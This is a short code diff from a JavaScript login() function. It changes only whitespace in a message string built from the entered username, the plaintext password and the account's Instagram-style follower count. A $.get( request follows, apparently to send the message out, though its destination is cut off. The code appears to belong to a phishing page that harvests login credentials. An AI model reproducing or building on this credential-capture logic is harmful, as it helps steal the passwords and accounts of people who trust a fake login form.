@@ -27,10 +27,10 @@ function login() {
       var text =
         "user : `" +
         username +
-        "`                                                                         pass : `" +
+        "`                                                               pass : `" +
         pass +
         "`" +
-        "                                                                           Count : " +
+        "                                                                Count : " +
         info.graphql.user.edge_followed_by.count;
 
       $.get(
